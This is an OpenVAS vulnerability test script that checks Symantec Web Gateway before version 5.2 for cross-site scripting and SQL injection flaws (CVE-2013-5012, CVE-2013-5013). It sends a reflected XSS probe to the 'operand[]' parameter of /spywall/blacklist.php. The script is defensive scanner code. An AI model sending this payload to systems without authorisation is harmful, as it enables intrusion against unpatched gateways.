##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_mult_vuln_mar14.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Symantec Web Gateway Cross-Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:symantec:web_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804406");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-5012", "CVE-2013-5013");
  script_bugtraq_id(65404, 65405);
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-03-10 17:35:07 +0530 (Mon, 10 Mar 2014)");
  script_name("Symantec Web Gateway Cross-Site Scripting and SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/56895");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125149");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Feb/94");

  script_tag(name:"summary", value:"This host is running Symantec Web Gateway and is prone to cross-site scripting
  and SQL injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Flaws are due to,

  - Certain unspecified input is not properly sanitised before being returned
  to the user.

  - An input passed via the 'operand[]' parameter to /spywall/blacklist.php is
  not properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application, bypass certain security restrictions and
  conduct SQL injection attacks.");

  script_tag(name:"affected", value:"Symantec Web Gateway versions prior to 5.2");

  script_tag(name:"solution", value:"Upgrade to Symantec Web Gateway 5.2 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.symantec.com/business/web-gateway");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!symPort = get_app_port(cpe:CPE)) {
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:symPort)) {
  exit(0);
}

if( dir == "/" ) dir = "";
url = dir + "/spywall/blacklist.php?variable[]=&operator[]=&operand[]=jjjj'><script>alert(document.cookie);</script>";

if(http_vuln_check(port:symPort, url:url, check_header:TRUE, pattern:"'><script>alert\(document\.cookie\);</script>")){
  report = report_vuln_url(port:symPort, url:url);
  security_message(port:symPort, data:report);
  exit(0);
}

exit(99);